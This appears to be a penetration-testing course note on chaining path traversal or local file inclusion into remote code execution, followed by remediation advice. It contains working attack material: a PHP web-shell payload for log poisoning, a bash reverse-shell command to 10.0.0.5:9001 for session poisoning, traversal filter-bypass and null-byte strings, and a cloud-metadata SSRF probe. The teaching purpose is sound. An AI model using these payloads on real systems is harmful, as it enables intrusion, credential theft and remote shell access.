---
tags: [chaining, advanced, real-world, vapt]
difficulty: expert
module: "60 - Advanced Chaining and Real-World Scenarios"
topic: "60.19 Chain Path Traversal to Shell"
---

# 60.19 - Chain Path Traversal to Shell

## 1. Introduction to Path Traversal

Path Traversal (also known as Directory Traversal) is a vulnerability that allows an attacker to read arbitrary files on the server that is running an application. This occurs when an application uses unvalidated user input to construct a file path that is then used to interact with the file system. 

By utilizing dot-dot-slash (`../`) sequences, an attacker can traverse up the directory structure, breaking out of the intended web root, to access critical configuration files, source code, credentials, and operating system components.

While reading sensitive files is a high-severity finding on its own, elite security engineers understand that a localized file read primitive (Local File Inclusion or LFI) is often just step one. By chaining this primitive with other environmental factors, an attacker can escalate an arbitrary file read into unauthenticated Remote Code Execution (RCE) and full shell access.

## 2. Theoretical Foundations: From LFI to RCE

To convert a Path Traversal / LFI into RCE, the attacker needs a way to inject malicious code into a file that the target application will parse and execute. This process typically involves two phases:
1. **Injection (The "Write" Primitive):** Finding a mechanism to write attacker-controlled data to a known file path on the server.
2. **Inclusion (The "Read/Execute" Primitive):** Using the Path Traversal vulnerability to include the poisoned file, forcing the application framework (e.g., PHP, Node.js via `eval()`, Java via template engines) to execute the payload.

Common files targeted for poisoning include:
- Web server access or error logs (`/var/log/nginx/access.log`, `/var/log/apache2/error.log`)
- SSH logs (`/var/log/auth.log`)
- User session files (`/var/lib/php/sessions/sess_XYZ`)
- Environmental variables (`/proc/self/environ`)
- Temporary files uploaded via multipart forms (`/tmp/phpXXXXXX`)

## 3. Attack Architecture and Flow Diagram

Below is a technical breakdown of the classic **Log Poisoning** attack chain leading to a reverse shell.

```text
 [ Attacker ]
    | 
    | (1) Identify LFI / Traversal Vulnerability
    | ?file=../../../../etc/passwd -> Returns root user info
    |
    | (2) Send malicious payload in User-Agent header to poison logs
    |  +-------------------------------------------------------------+
    |  | GET / HTTP/1.1                                              |
    |  | Host: target.com                                            |
    |  | User-Agent: <?php system($_GET['cmd']); ?>                  |
    |  +-------------------------------------------------------------+
    v
 [ Target Web Server (Apache/Nginx) ]
    |
    | (3) Web Server logs the request, writing the PHP payload to disk
    v
 [ File System: /var/log/apache2/access.log ]
    | Contains: "192.168.1.10 - - [09/Jun/2026] "GET /" 200 <?php system($_GET['cmd']); ?>"
    |
    | (4) Attacker triggers the LFI, including the poisoned log file
 [ Attacker ]
    | GET /view.php?file=../../../../var/log/apache2/access.log&cmd=id
    v
 [ PHP Engine ]
    | (5) Application reads access.log
    | (6) PHP parser encounters <?php ... ?> tags inside the log file
    | (7) PHP executes the embedded system() command
    v
 [ Operating System Shell ]
    | (8) Executes 'id' -> uid=33(www-data) gid=33(www-data)
    | (9) Command output returned in HTTP response
    v
 [ Attacker Obtains Remote Command Execution (RCE) ]
```

## 4. Advanced Bypasses for Traversal Filters

WAFs and application code often attempt to filter traversal sequences. Bypassing these filters is a prerequisite to exploiting the chain.

### 4.1 Filter Evasion Techniques
- **Nested Traversal:** If the application replaces `../` with an empty string, an attacker can use `....//` or `..././`. When `../` is stripped, the remaining characters collapse into a valid `../`.
  - Payload: `?file=....//....//....//etc/passwd`
- **URL Encoding:** Encoding the dots or slashes.
  - Standard URL encoding: `%2e%2e%2f`
  - Double URL encoding: `%252e%252e%252f`
- **Null Byte Injection:** Older PHP versions (< 5.3.4) suffer from null byte (`%00`) injection, terminating the string and dropping appended extensions (e.g., `.php`).
  - Payload: `?file=../../../../etc/passwd%00`
- **Absolute Path Bypass:** If the filter only looks for relative sequences, supplying the absolute path directly might work.
  - Payload: `?file=/etc/passwd`

## 5. Exploitation Scenario: PHP Session Poisoning

If the web server logs are inaccessible due to permissions (e.g., readable only by root, while the web app runs as `www-data`), an alternative is Session Poisoning.

### Step 1: Identifying the Session Cookie
The attacker identifies their session cookie: `PHPSESSID=hacker12345`.
In PHP, this session data is often stored at `/var/lib/php/sessions/sess_hacker12345` or `/tmp/sess_hacker12345`.

### Step 2: Poisoning the Session
The attacker finds a feature where their input is stored in the session, such as updating their profile name. They set their profile name to:
`<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.5/9001 0>&1'"); ?>`

### Step 3: Triggering the LFI
The attacker navigates to the vulnerable endpoint and traverses to their session file:
`GET /download.php?file=../../../../var/lib/php/sessions/sess_hacker12345`

### Step 4: Obtaining the Reverse Shell
When `download.php` uses `include()` or `require()` on the user-supplied file path, the PHP engine parses the session file. It hits the injected PHP payload, executes the reverse shell command, and connects back to the attacker's Netcat listener (`nc -lvnp 9001`).

## 6. Real-World Equivalents in Modern Frameworks

While PHP `include()` is the classic example, similar chains exist in modern stacks:
- **Node.js:** Reading `/proc/self/environ` to steal `AWS_ACCESS_KEY_ID` or database connection strings, then using those credentials to pivot.
- **Java (Spring Boot):** Using Path Traversal to read `application.properties` or `application.yml` to extract hardcoded secrets, JWT signing keys, or database passwords.
- **Template Engines (Jinja2/Twig):** Uploading a malicious template file, then using Path Traversal to render that file, leading to Server-Side Template Injection (SSTI) and RCE.

## 7. Remediation and Secure Architecture

Preventing Path Traversal requires stringent validation and architectural isolation.

1. **Avoid Direct Object References:** Never pass raw filenames from the client directly to file system APIs. Use indirectly mapped identifiers (e.g., an integer ID or a UUID mapped to a file path in the database).
2. **Canonicalization:** If file paths must be constructed dynamically, the backend should resolve the absolute, canonical path (e.g., using `realpath()` in PHP or `path.resolve()` in Node.js) and strictly verify that the resolved path begins with the intended base directory.
   ```javascript
   const baseDirectory = '/var/www/uploads/';
   const resolvedPath = path.resolve(baseDirectory, userInput);
   if (!resolvedPath.startsWith(baseDirectory)) {
       throw new Error("Path traversal attempt detected");
   }
   ```
3. **Least Privilege:** Run the web application with a low-privileged service account. The application should not have read access to `/etc/shadow`, `/var/log`, or system configurations.
4. **Disable Remote Inclusions:** Ensure configurations like `allow_url_include=Off` are set in PHP.

## 8. Chaining Opportunities

- **[[10 - Server-Side Request Forgery (SSRF)]]**: If local file read fails, the input might be interpreted as a URL, allowing SSRF (e.g., `?file=http://169.254.169.254/latest/meta-data/`).
- **[[08 - IDOR to Account Takeover]]**: Using path traversal to read other users' uploaded sensitive documents (e.g., tax forms, passports) stored on disk.
- **[[22 - Exploiting File Upload Vulnerabilities]]**: Chain a restricted file upload (e.g., uploading an avatar) with Path Traversal to execute the uploaded file outside the expected directory.

## 9. Related Notes

- [[05 - Command Injection Fundamentals]]
- [[26 - Web Application Firewalls (WAF) Evasion]]
- [[38 - Penetration Testing Linux Environments]]
- [[48 - Advanced Post-Exploitation Persistence]]
